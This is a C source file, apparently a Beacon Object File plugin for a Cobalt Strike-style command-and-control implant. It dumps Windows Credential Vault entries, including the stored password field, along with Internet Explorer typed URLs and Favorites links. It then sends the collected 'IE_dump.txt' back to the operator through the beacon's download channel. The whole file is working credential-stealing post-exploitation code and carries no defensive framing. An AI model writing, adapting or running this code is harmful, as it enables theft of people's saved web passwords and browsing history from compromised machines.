#include "plg_common.h"

#ifndef CSIDL_FAVORITES
#define CSIDL_FAVORITES 6
#endif
#ifndef KEY_READ
#define KEY_READ 0x20019
#endif

typedef struct _VIW8 {
	GUID SchemaId;
	PVOID pszCredentialFriendlyName;
	PVOID pResourceElement;
	PVOID pIdentityElement;
	PVOID pAuthenticatorElement;
	PVOID pPackageSid;
	UINT64 LastModified;
	DWORD dwFlags;
	DWORD dwPropertiesCount;
	PVOID pPropertyElements;
} VIW8;

/* 实现位于 vaultcli.dll；BOF 加载器用 LoadLibrary(模块名$ 前缀)，须为 VAULTCLI */
WINBASEAPI LONG WINAPI VAULTCLI$VaultEnumerateVaults(DWORD, DWORD *, void **);
WINBASEAPI LONG WINAPI VAULTCLI$VaultOpenVault(GUID *, DWORD, void **);
WINBASEAPI LONG WINAPI VAULTCLI$VaultEnumerateItems(void *, DWORD, DWORD *, void **);
WINBASEAPI LONG WINAPI VAULTCLI$VaultGetItem(void *, GUID *, PVOID, PVOID, PVOID, PVOID, DWORD, PVOID *);
WINBASEAPI LONG WINAPI VAULTCLI$VaultFree(PVOID);
WINBASEAPI LONG WINAPI VAULTCLI$VaultCloseVault(void *);

WINBASEAPI HRESULT WINAPI SHELL32$SHGetFolderPathA(HWND, int, HANDLE, DWORD, LPSTR);

WINADVAPI LONG WINAPI ADVAPI32$RegOpenKeyExA(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
WINADVAPI LONG WINAPI ADVAPI32$RegQueryValueExA(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
WINADVAPI LONG WINAPI ADVAPI32$RegCloseKey(HKEY);

static int pjoin(char *o, size_t z, const char *a, const char *b) {
	int n = MSVCRT$_snprintf(o, z, "%s\\%s", a, b);
	return (n > 0 && (size_t)n < z) ? 0 : -1;
}

static void ie_out_name(char *dst, size_t dz, const char *prefix, const char *suffix) {
	if (prefix && prefix[0])
		MSVCRT$_snprintf(dst, dz, "%s_%s", prefix, suffix);
	else
		MSVCRT$_snprintf(dst, dz, "%s", suffix);
}

static void fmt_wstr_simple(formatp *f, const wchar_t *w) {
	if (!w)
		return;
	for (; *w; w++) {
		if (*w < 128)
			BeaconFormatPrintf(f, "%c", (char)*w);
		else
			BeaconFormatPrintf(f, "?");
	}
}

static void vault_dump_elem(formatp *f, const char *label, void *elem) {
	int typ;
	PVOID *pp;
	if (!elem)
		return;
	typ = *(int *)((unsigned char *)elem + 8);
	if (typ != 7)
		return;
	pp = (PVOID *)((unsigned char *)elem + 16);
	BeaconFormatPrintf(f, "%s: ", label);
	fmt_wstr_simple(f, (const wchar_t *)*pp);
	BeaconFormatPrintf(f, "\n");
}

static void plg_ie_vault(formatp *f) {
	DWORD nvault = 0, i, j;
	void *guidblk = NULL, *vh = NULL, *items = NULL;
	LONG hr;
	BeaconFormatPrintf(f, "=== IE/Edge Vault (Web Credentials 等) ===\n");
	hr = VAULTCLI$VaultEnumerateVaults(0, &nvault, &guidblk);
	if (hr != 0 || !guidblk || nvault == 0) {
		BeaconFormatPrintf(f, "[i] VaultEnumerateVaults 失败或非 Win8+ (hr=0x%lx)\n", (unsigned long)hr);
		if (guidblk)
			VAULTCLI$VaultFree(guidblk);
		return;
	}
	for (i = 0; i < nvault; i++) {
		GUID *vg = (GUID *)((char *)guidblk + (size_t)i * sizeof(GUID));
		DWORD nitem = 0;
		VIW8 *list, *it;
		vh = NULL;
		hr = VAULTCLI$VaultOpenVault(vg, 0, &vh);
		if (hr != 0 || !vh)
			continue;
		items = NULL;
		hr = VAULTCLI$VaultEnumerateItems(vh, 512, &nitem, &items);
		if (hr != 0 || !items || nitem == 0) {
			VAULTCLI$VaultCloseVault(vh);
			continue;
		}
		list = (VIW8 *)items;
		for (j = 0; j < nitem; j++) {
			VIW8 *ent = list + j;
			void *got = NULL;
			hr = VAULTCLI$VaultGetItem(vh, &ent->SchemaId, ent->pResourceElement, ent->pIdentityElement,
			    ent->pPackageSid, NULL, 0, &got);
			if (hr != 0 || !got)
				continue;
			{
				VIW8 *full = (VIW8 *)got;
				BeaconFormatPrintf(f, "--- item ---\n");
				vault_dump_elem(f, "resource", full->pResourceElement);
				vault_dump_elem(f, "identity", full->pIdentityElement);
				vault_dump_elem(f, "packageSid", full->pPackageSid);
				vault_dump_elem(f, "password", full->pAuthenticatorElement);
				BeaconFormatPrintf(f, "\n");
			}
			VAULTCLI$VaultFree(got);
		}
		VAULTCLI$VaultFree(items);
		VAULTCLI$VaultCloseVault(vh);
	}
	VAULTCLI$VaultFree(guidblk);
}

static void plg_ie_typedurls(formatp *f) {
	HKEY hk = NULL;
	int n;
	LONG e;
	BeaconFormatPrintf(f, "\n=== Internet Explorer TypedURLs ===\n");
	e = ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\TypedURLs", 0, KEY_READ, &hk);
	if (e != 0 || !hk)
		return;
	for (n = 1; n < 26; n++) {
		char vn[16], buf[2048];
		DWORD t = 0, bl = sizeof(buf) - 1;
		MSVCRT$_snprintf(vn, sizeof(vn), "url%d", n);
		buf[0] = 0;
		e = ADVAPI32$RegQueryValueExA(hk, vn, NULL, &t, (LPBYTE)buf, &bl);
		if (e == 0 && buf[0])
			BeaconFormatPrintf(f, "%s\n", buf);
	}
	ADVAPI32$RegCloseKey(hk);
}

static int ends_with_url(const char *name) {
	size_t L = MSVCRT$strlen(name);
	return L > 4 && MSVCRT$_stricmp(name + L - 4, ".url") == 0;
}

static void append_url_file(formatp *f, const char *path) {
	unsigned char *raw = NULL;
	DWORD rlen = 0;
	const char *p, *q;
	if (plg_read_file_a(path, &raw, &rlen) < 0)
		return;
	raw[rlen < 256 * 1024 ? rlen : 256 * 1024] = 0;
	p = MSVCRT$strstr((char *)raw, "URL=");
	if (!p) {
		plg_free(raw);
		return;
	}
	p += 4;
	BeaconFormatPrintf(f, "%s\n\t", path);
	q = p;
	while (*q && *q != '\r' && *q != '\n')
		q++;
	BeaconFormatPrintf(f, "%.*s\n", (int)(q - p), p);
	plg_free(raw);
}

static void scan_favorites_dir(const char *dir, int depth, formatp *f) {
	char pat[PLG_MAX_PATH];
	WIN32_FIND_DATAA fd;
	HANDLE h;
	if (depth > 12)
		return;
	if (pjoin(pat, sizeof(pat), dir, "*") != 0)
		return;
	h = KERNEL32$FindFirstFileA(pat, &fd);
	if (h == INVALID_HANDLE_VALUE)
		return;
	do {
		char sub[PLG_MAX_PATH];
		if (fd.cFileName[0] == '.')
			continue;
		if (pjoin(sub, sizeof(sub), dir, fd.cFileName) != 0)
			continue;
		if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			scan_favorites_dir(sub, depth + 1, f);
			continue;
		}
		if (ends_with_url(fd.cFileName))
			append_url_file(f, sub);
	} while (KERNEL32$FindNextFileA(h, &fd));
	KERNEL32$FindClose(h);
}

static void plg_ie_favorites(formatp *f) {
	char fav[PLG_MAX_PATH];
	HRESULT hres;
	BeaconFormatPrintf(f, "\n=== Favorites (*.url) ===\n");
	hres = SHELL32$SHGetFolderPathA(NULL, CSIDL_FAVORITES, NULL, 0, fav);
	if (hres != 0 || fav[0] == 0)
		return;
	scan_favorites_dir(fav, 0, f);
}

void plg_ie_dump(const char *file_prefix) {
	formatp fmt;
	char name[160], sfx[64];
	char *data;
	int sz;
	BeaconFormatAlloc(&fmt, 768 * 1024);
	plg_ie_vault(&fmt);
	plg_ie_typedurls(&fmt);
	plg_ie_favorites(&fmt);
	data = BeaconFormatToString(&fmt, &sz);
	MSVCRT$strcpy(sfx, "IE_dump.txt");
	ie_out_name(name, sizeof(name), file_prefix, sfx);
	if (data && sz > 32)
		AxDownloadMemory(name, data, sz);
	BeaconFormatFree(&fmt);
	BeaconPrintf(CALLBACK_OUTPUT, "[+] IE/Vault/收藏夹 -> %s", name);
}
